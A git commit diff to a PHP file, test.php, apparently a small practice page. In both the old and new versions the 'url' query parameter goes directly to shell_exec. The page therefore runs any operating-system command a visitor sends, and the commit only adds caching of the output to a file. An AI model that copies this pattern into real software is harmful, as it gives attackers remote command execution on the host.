b366c671c74da74d720e249c6e4510a0836632ee
sunsh9876543210 <82513690+sunsh9876543210@users.noreply.github.com>
2024-05-01 13:48:36 +0900

    Update test.php

--- test.php
+++ test.php
@@ -8,9 +8,12 @@
     <?php
         if(isset($_GET['url'])){
             $url = $_GET['url'];
-              $result = shell_exec($_GET['url']);
-              echo "{$result}";
-              return;
+            $result = shell_exec($_GET['url']);
+            $cache_file = './cache/'.md5($url);
+            file_put_contents($cache_file, $result);
+            echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
+            echo '<pre>'. htmlentities($result) .'</pre>';
+            return;
         }else{
         ?>
             <form>
